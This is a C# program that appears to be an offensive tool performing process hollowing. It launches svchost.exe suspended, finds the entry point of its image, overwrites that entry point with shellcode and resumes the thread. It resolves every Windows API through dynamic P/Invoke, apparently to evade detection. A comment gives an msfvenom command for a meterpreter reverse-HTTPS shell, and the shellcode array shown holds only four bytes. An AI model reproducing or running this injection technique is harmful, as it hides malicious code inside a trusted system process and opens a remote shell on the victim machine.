using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace Standard_Process_Hollowing_Dynamic_Invoke
{
    class Program
    {

        // Structure for STARTUPINFO used by CreateProcess
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // Structure for PROCESS_INFORMATION used by CreateProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        // Structure for PROCESS_BASIC_INFORMATION used by ZwQueryInformationProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, argumentTypes);
        }
        public static bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            var parameterTypes = new Type[] { typeof(string), typeof(string), typeof(IntPtr), typeof(IntPtr), typeof(bool), typeof(uint), typeof(IntPtr), typeof(string), typeof(STARTUPINFO).MakeByRefType(), typeof(PROCESS_INFORMATION).MakeByRefType() };
            var arguments = new object[] { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, new PROCESS_INFORMATION() };

            bool result = (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "CreateProcessA", arguments, parameterTypes);

            lpProcessInformation = (PROCESS_INFORMATION)arguments[9];
            return result;
        }


        public static int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(int), typeof(PROCESS_BASIC_INFORMATION).MakeByRefType(), typeof(uint), typeof(uint).MakeByRefType() };
            var arguments = new object[] { hProcess, procInformationClass, procInformation, ProcInfoLen, retlen };

            int result = (int)DynamicInvoke(typeof(int), "ntdll.dll", "ZwQueryInformationProcess", arguments, parameterTypes);

            procInformation = (PROCESS_BASIC_INFORMATION)arguments[2];
            retlen = (uint)arguments[4];
            return result;
        }


        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var arguments = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "ReadProcessMemory", arguments, parameterTypes);

            lpNumberOfBytesRead = (IntPtr)arguments[4];
            return result;
        }


        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var arguments = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "WriteProcessMemory", arguments, parameterTypes);

            lpNumberOfBytesWritten = (IntPtr)arguments[4];
            return result;
        }


        public static uint ResumeThread(IntPtr hThread)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hThread };

            return (uint)DynamicInvoke(typeof(uint), "kernel32.dll", "ResumeThread", arguments, parameterTypes);
        }


        static void Main(string[] args)
        {
            // Initialize STARTUPINFO and PROCESS_INFORMATION structures
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Create a new process (svchost.exe)
            bool res = CreateProcess(
                null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            // Initialize PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            // Query process information to get the base address of the process
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read the memory to get the base address of svchost.exe
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Read the PE header of svchost.exe
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // Get the entry point of svchost.exe
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[4] { 0xfc,0x48,0x83,0xe4 };

            // Write the shellcode to the entry point of svchost.exe
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            // Resume the main thread of svchost.exe
            ResumeThread(pi.hThread);
        }
    }
}
